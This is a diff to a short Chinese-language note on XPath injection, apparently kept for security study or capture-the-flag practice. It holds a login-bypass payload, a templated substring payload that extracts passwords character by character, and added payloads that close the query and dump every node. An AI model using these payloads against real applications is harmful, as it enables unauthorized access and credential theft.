@@ -1,4 +1,4 @@
-- # 注入示例
+# 注入示例
 	- ```xpath
 	  admin' or 1=1 or '
 	  ```
@@ -15,3 +15,6 @@
 		- ```xpath
 		  admin' or substring(/root/accounts/*[position()=2]/password/text(),{},1)='{}' or '
 		  ```
+- # 查询所有节点
+	- 首先测试闭合：`1']|//*['`
+	- 然后直接爆：`1']|//*|//*['`
